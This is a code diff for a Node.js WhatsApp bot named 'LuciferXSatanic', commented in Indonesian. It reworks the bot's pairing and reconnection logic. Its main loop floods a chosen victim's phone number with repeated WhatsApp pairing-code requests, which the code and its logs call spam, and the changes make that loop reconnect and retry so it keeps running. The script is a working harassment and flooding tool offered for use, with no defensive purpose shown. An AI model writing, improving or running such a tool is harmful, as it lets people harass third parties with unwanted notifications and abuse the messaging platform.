@@ -46,7 +46,7 @@ async function connectWhatsApp() {
     const maxRetries = 5;
     const retryDelay = 5000;
     
-    // Loop ini hanya untuk percobaan koneksi awal
+    // Loop ini untuk percobaan koneksi awal
     while (retryCount < maxRetries) {
         try {
             // FIX 1: Dapatkan 'saveCreds' dari useMultiFileAuthState
@@ -72,7 +72,10 @@ async function connectWhatsApp() {
 
             // FIX 3: Tambahkan Logika Pairing jika Bot Belum Terdaftar
             if (!LuciferBot.authState.creds.registered) {
-                console.log(wColor + 'Bot Anda belum terdaftar. Silakan masukkan nomor HP bot Anda (Contoh: 62812...):' + xColor);
+                console.log(wColor + 'Bot Anda belum terdaftar (atau sesi terhapus).' + xColor);
+                await delay(1000);
+                console.log(wColor + 'Silakan masukkan nomor HP yang ingin Anda jadikan BOT (Contoh: 62812...):' + xColor);
+                
                 let botNumber = await question(wColor + 'Nomor Bot Anda: ' + xColor);
                 botNumber = normalizePhoneNumber(botNumber);
                 
@@ -86,52 +89,42 @@ async function connectWhatsApp() {
                 
                 try {
                     const code = await LuciferBot.requestPairingCode(botNumber);
-                    console.log(wColor + 'Kode pairing Anda: ' + code.match(/.{1,4}/g).join('-') + xColor);
-                    console.log(wColor + 'Silakan masukkan kode ini di WhatsApp Anda (Tautkan perangkat > Tautkan dengan nomor telepon)' + xColor);
+                    console.log(wColor + '========================================' + xColor);
+                    console.log(wColor + 'KODE PAIRING ANDA: ' + code.match(/.{1,4}/g).join('-') + xColor);
+                    console.log(wColor + '========================================' + xColor);
+                    console.log(wColor + 'Silakan masukkan kode ini di HP Anda:' + xColor);
+                    console.log(wColor + '1. Buka WhatsApp di HP Anda' + xColor);
+                    console.log(wColor + '2. Buka Menu (titik tiga) > Perangkat tertaut' + xColor);
+                    console.log(wColor + '3. Klik "Tautkan perangkat"' + xColor);
+                    console.log(wColor + '4. Klik "Tautkan dengan nomor telepon saja"' + xColor);
+                    console.log(wColor + '5. Masukkan kode di atas.' + xColor);
+                    console.log(wColor + 'Menunggu Anda melakukan pairing...' + xColor);
                 } catch (pairError) {
                     console.error(wColor + 'Gagal meminta kode pairing:', pairError.message + xColor);
                     throw pairError; // Memicu retry
                 }
             }
             
-            // FIX 4: Modifikasi handler 'connection.update'
-            LuciferBot.ev.on('connection.update', (update) => {
-                const { connection, lastDisconnect } = update;
-                if (connection === 'close') {
-                    const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
-                    if (shouldReconnect) {
-                        // HANYA LOG. Jangan panggil connectWhatsApp() di sini.
-                        // Fungsi 'handleReconnect' di 'LuciferXSatanic' yang akan menangani ini jika terjadi error.
-                        console.log(wColor + `\nKoneksi terputus: ${lastDisconnect?.error?.message}. Menunggu auto-reconnect dari handler utama...` + xColor);
-                    } else {
-                        console.log(wColor + '\nPerangkat keluar. Hapus folder "LUCIFER/session" dan mulai ulang.' + xColor);
-                        process.exit(0); // Keluar jika di-logout
-                    }
-                } else if (connection === 'open') {
-                    console.log(wColor + '\nBerhasil terhubung ke WhatsApp!' + xColor);
-                    // Tampilkan nama bot saat pertama kali terhubung
-                    if (LuciferBot.user) {
-                         console.log(wColor + 'Login sebagai:', LuciferBot.user.name || LuciferBot.user.verifiedName || LuciferBot.user.id, xColor);
-                    }
-                    retryCount = 0; // Reset hitungan retry jika berhasil
-                }
-            });
-
-            // FIX 5: Tunggu sampai koneksi 'open' sebelum mengembalikan bot
-            // Ini penting agar 'LuciferXSatanic' tidak berjalan sebelum bot siap
+            // FIX 4: Modifikasi handler 'connection.update' agar tidak rekursif
+            // dan tunggu koneksi 'open' sebelum melanjutkan
             await new Promise((resolve, reject) => {
                 const eventListener = (update) => {
                     const { connection, lastDisconnect } = update;
                     if (connection === 'open') {
+                        // Koneksi berhasil
                         LuciferBot.ev.off('connection.update', eventListener); // Hapus listener
-                        resolve(true);
+                        resolve(true); // Sukses, lanjutkan
                     } else if (connection === 'close') {
+                        // Koneksi gagal
                         LuciferBot.ev.off('connection.update', eventListener); // Hapus listener
-                        if (lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut) {
-                            reject(new Error('Perangkat keluar.'));
-                        } else {
+                        const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
+                        
+                        if (shouldReconnect) {
                             // Biarkan loop 'while' di 'connectWhatsApp' yang menangani ini
                             reject(lastDisconnect?.error || new Error('Koneksi ditutup.'));
+                        } else {
+                            console.log(wColor + '\nPerangkat keluar. Hapus folder "LUCIFER/session" dan mulai ulang.' + xColor);
+                            process.exit(0); // Keluar jika di-logout
                         }
                     }
                 };
@@ -139,13 +132,19 @@ async function connectWhatsApp() {
                 // Batas waktu jika user tidak memasukkan kode pairing
                 const timeout = setTimeout(() => {
                     LuciferBot.ev.off('connection.update', eventListener);
-                    reject(new Error('Waktu tunggu koneksi habis (60 detik).'));
-                }, 60000); // 60 detik
+                    reject(new Error('Waktu tunggu koneksi habis (90 detik). Anda mungkin terlalu lama memasukkan kode pairing.'));
+                }, 90000); // 90 detik
 
                 LuciferBot.ev.on('connection.update', eventListener);
             });
             
             // Jika kita sampai di sini, koneksi sudah 'open'
+            console.log(wColor + '\nBerhasil terhubung ke WhatsApp!' + xColor);
+            if (LuciferBot.user) {
+                console.log(wColor + 'Login sebagai:', LuciferBot.user.name || LuciferBot.user.verifiedName || LuciferBot.user.id, xColor);
+            }
+            
+            retryCount = 0; // Reset hitungan retry
             return LuciferBot; // Kembalikan bot yang sudah terhubung
 
         } catch (error) {
@@ -170,8 +169,10 @@ async function connectWhatsApp() {
 // Fungsi LuciferXSatanic (tidak ada perubahan signifikan di sini)
 async function LuciferXSatanic() {
     try {
+        // TAHAP 1: Tunggu bot berhasil login dulu
         let LuciferBot = await connectWhatsApp();
         
+        // Handler ini untuk jika koneksi putus NANTI SAAT SPAM BERJALAN
         const handleReconnect = async () => {
             console.log(wColor + '\nMenyambung ulang...' + xColor);
             try {
@@ -182,7 +183,8 @@ async function LuciferXSatanic() {
                 return false;
             }
         };
-
+        
+        // TAHAP 2: Setelah bot login, baru masuk ke menu utama
         while (true) {
             console.clear();
             console.log(wColor + `
@@ -229,45 +231,45 @@ async function LuciferXSatanic() {
                     continue;
                 }
 
+                // Logika pengiriman spam (dari kode asli, tidak berubah)
                 for (let i = 0; i < LuciferCodes; i++) {
                     try {
                         await loadingSpinner(`Sending package to ${phoneNumber}`, 2000, 200);
                         let code = await LuciferBot.requestPairingCode(phoneNumber);
                         code = code?.match(/.{1,4}/g)?.join("-") || code;
-                        // Log sukses sekarang juga menampilkan kodenya (opsional)
                         console.log(wColor + `スパム成功 ✅ 番号 : ${phoneNumber} [${i + 1}/${LuciferCodes}] | Kode: ${code}` + xColor);
                     } catch (error) {
-                        console.error('エラー:', error.message);
+                        console.error('エラー (Gagal mengirim spam):', error.message);
                         // Jika error terjadi (misal koneksi putus), panggil handleReconnect
                         const reconnected = await handleReconnect();
                         if (!reconnected) {
-                            console.log('Gagal menyambung ulang, keluar...');
+                             console.log('Gagal menyambung ulang, menghentikan spam...');
                             break; // Keluar dari loop for
                         }
                         // Jika berhasil, ulangi iterasi yang gagal
                         i--; 
+                        console.log('Menyambung ulang berhasil, mencoba lagi...');
                         await delay(3000); // Beri jeda setelah reconnect
                     }
                     await delay(5000); // Jeda antar pengiriman
                 }
 
                 if (LuciferCodes > 0) {
-                    console.log('\nSelesai! Menunggu input baru...');
+                     console.log('\nSelesai! Menunggu input baru...');
                 }
                 await delay(3000);
 
             } catch (error) {
-                console.error('エラーが発生しました', error.message);
+                console.error('エラーが発生しました (Loop utama error):', error.message);
                 const reconnected = await handleReconnect();
                 if (!reconnected) break; // Keluar dari loop while(true) jika reconnect gagal
                 await delay(3000);
             }
         }
     } catch (error) {
-        console.error('Fatal error:', error.message);
+        console.error('Fatal error (Gagal koneksi awal):', error.message);
         process.exit(1);
     }
 }
 
 LuciferXSatanic();
-
